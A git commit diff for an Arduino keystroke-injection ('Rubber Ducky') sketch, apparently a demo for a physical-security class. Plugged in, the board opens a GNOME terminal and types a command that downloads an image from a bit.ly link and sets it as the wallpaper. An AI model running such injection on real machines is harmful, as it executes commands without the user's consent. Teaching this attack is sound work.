26d33f1e07eafd6e90853ca660bd0d79f2244741
Alvaro Figueroa <alvaro@greencore.co.cr>
2016-12-08 14:24:31 -0600

    Keyboard layout initial support, slowless multiplier to work easyer with slow machines

--- README.md
+++ README.md
@@ -16,3 +16,25 @@ Please let me know if you would like me to adapt any other popular Rubber Ducky 
 It takes less than 5 seconds after the device is connected to the USB port for it to open the terminal, download the payload and change the background.
 
 I added support for CircuitPlayground.slideSwitch(), so it will only run the attack based on the switch. This makes it easy to load without a proper flash rig.
+
+This is designed to work on a gnome-based graphical interface, using the KEY_LEFT_GUI to pull the menu, and then pull a terminal from it.
+
+## Instructions
+
+1. You need to know the keyboard layout of the classroom in advance, as it need to know how to write caracters such as "&". Inside the source you can comment and uncomment the following lines to suit your environment.
+
+```
+#define KEYB_US
+//#define KEYB_LA
+```
+
+2. If the graphical interface where you are working is responding slowly (slow graphical card, VMs running on slow hardware, etc) do increase the following value, and **re-test** that it works. The smaller the number, the faster the attack, but if the number is too small, the **attack will fail**.
+
+## How to "fix" the attack
+In order to leave the system like it was, you only need to revert to the gnome background that was running before the attack and that is it.
+
+## TODO
+
+- [x] Add support for US and LA-Latin keyboard layouts. If you need extra layouts please let us know.
+- [x] "Slowlyness" multiplier, to make it easy to work with slower computers
+- [ ] If someone requests it, ability to work on other GUIs or other OSs.
--- playground-ducky/playground-ducky.ino
+++ playground-ducky/playground-ducky.ino
@@ -5,25 +5,39 @@
 // El ataque ha sido personalizado para las estaciones de trabajo de Greencore Solutions
 // para el curso de Seguridad Informática, clase de Seguridad Física
 
-
-
 #include <Adafruit_CircuitPlayground.h>
 #include <Wire.h>
 #include <SPI.h>
 #include <Keyboard.h>
 
+// Si su interface grafica es muy lenta,
+// haga este numero mas grande y *pruebe de nuevo*
+const uint8_t slow_multiplier = 1000;
+
+// Necesitamos saber *antes* el layout de teclado
+#define KEYB_US
+//#define KEYB_LA
+
+#ifdef KEYB_US
+  char ampersand_char = "&";
+#endif
+#ifdef KEYB_LA
+  char ampersand_char = "^";
+#endif
+
+
 void setup() {
   CircuitPlayground.begin(); // Iniciamos funciones del Playground, necesario para luces más adelante
   if (CircuitPlayground.slideSwitch()) {
     Keyboard.begin();          // Iniciamos funcionalidad de teclado
-    delay(1000);               // Esperamos un segundo a que el equipo nos registre como teclado
+    delay(2 * slow_multiplier);               // Esperamos un segundo a que el equipo nos registre como teclado
     Keyboard.write(0x83);      // Caracter de "KEY_LEFT_GUI"
-    delay(1300);               // Algunos basados en Gnome se toman su tiempo
+    delay(1.3 * slow_multiplier);               // Algunos basados en Gnome se toman su tiempo
     Keyboard.write(0xB0);      // Enter nos lleva a escribir
-    delay(1000);
+    delay(1 * slow_multiplier);
     Keyboard.print("terminal");// Abrimos una terminal
     Keyboard.write(0xB0);      // Y damos enter
-    delay(1000);
+    delay(2 * slow_multiplier);
     Keyboard.print("wget -O tele.jpg http://bit.ly/2c7nVwO && gsettings set org.gnome.desktop.background picture-uri file://$(pwd)/tele.jpg && exit");
     Keyboard.write(0xB0);      // Fondo de los teletubies, castigo de Alf Delgado en FuerzaG :)
     Keyboard.println("");
